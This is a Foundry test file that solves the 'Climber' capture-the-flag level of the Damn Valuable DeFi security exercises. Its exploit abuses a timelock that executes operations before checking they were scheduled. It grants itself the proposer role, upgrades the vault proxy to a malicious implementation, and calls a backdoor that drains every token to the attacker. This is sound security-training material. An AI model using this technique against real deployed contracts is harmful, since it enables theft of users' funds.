// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";

import {EvilClimberVault} from "../../../src/Contracts/climber/EvilClimberVault.sol";

contract Climber is Test {
    uint256 internal constant VAULT_TOKEN_BALANCE = 10_000_000e18;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    ClimberTimelock internal climberTimelock;
    ClimberVault internal climberImplementation;
    ERC1967Proxy internal climberVaultProxy;
    address[] internal users;
    address payable internal deployer;
    address payable internal proposer;
    address payable internal sweeper;
    address payable internal attacker;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        utils = new Utilities();
        users = utils.createUsers(3);

        deployer = payable(users[0]);
        proposer = payable(users[1]);
        sweeper = payable(users[2]);

        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, 0.1 ether);

        // Deploy the vault behind a proxy using the UUPS pattern,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        climberImplementation = new ClimberVault();
        vm.label(address(climberImplementation), "climber Implementation");

        bytes memory data = abi.encodeWithSignature(
            "initialize(address,address,address)",
            deployer,
            proposer,
            sweeper
        );
        climberVaultProxy = new ERC1967Proxy(
            address(climberImplementation),
            data
        );

        assertEq(
            ClimberVault(address(climberVaultProxy)).getSweeper(),
            sweeper
        );

        assertGt(
            ClimberVault(address(climberVaultProxy))
                .getLastWithdrawalTimestamp(),
            0
        );

        climberTimelock = ClimberTimelock(
            payable(ClimberVault(address(climberVaultProxy)).owner())
        );

        assertTrue(
            climberTimelock.hasRole(climberTimelock.PROPOSER_ROLE(), proposer)
        );

        assertTrue(
            climberTimelock.hasRole(climberTimelock.ADMIN_ROLE(), deployer)
        );

        // Deploy token and transfer initial token balance to the vault
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");
        dvt.transfer(address(climberVaultProxy), VAULT_TOKEN_BALANCE);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    bytes[] sign;
    address[] addr;
    uint256[] val;

    function schedule() public {
        climberTimelock.schedule(addr, val, sign, 0);
    }

    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker, attacker);
        // Define the set proposer role operation
        addr.push(address(climberTimelock));
        val.push(0);
        sign.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            )
        );
        // You must include schedule definition to set a valid operationId.
        addr.push(address(this));
        val.push(0);
        sign.push(abi.encodeWithSelector(this.schedule.selector));
        // Execute Proposer role grant
        climberTimelock.execute(addr, val, sign, 0);

        //Clear variables for a second operation:
        addr.pop();
        addr.pop();
        val.pop();
        val.pop();
        sign.pop();
        sign.pop();

        // Define upgrade to a evil contract wit a public withdraw
        EvilClimberVault evilClimberContract = new EvilClimberVault();
        addr.push(address(climberVaultProxy));
        val.push(0);
        sign.push(
            abi.encodeWithSignature(
                "upgradeTo(address)",
                address(evilClimberContract)
            )
        );
        // You must include schedule definition to set a valid operationId.
        addr.push(address(this));
        val.push(0);
        sign.push(abi.encodeWithSelector(this.schedule.selector));
        //Execute upgrade
        climberTimelock.execute(addr, val, sign, 0);

        // Execute a withdraw (remember climberVaultProxy address is the token owner and
        // evilClimberContract only owns the logic executed in climberVaultProxy )
        bytes memory attack_func_sign = abi.encodeWithSignature(
            "backdoor(address,address)",
            attacker,
            address(dvt)
        );
        address(climberVaultProxy).call(attack_func_sign);

        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        /** SUCCESS CONDITIONS */
        assertEq(dvt.balanceOf(attacker), VAULT_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(climberVaultProxy)), 0);
    }
}
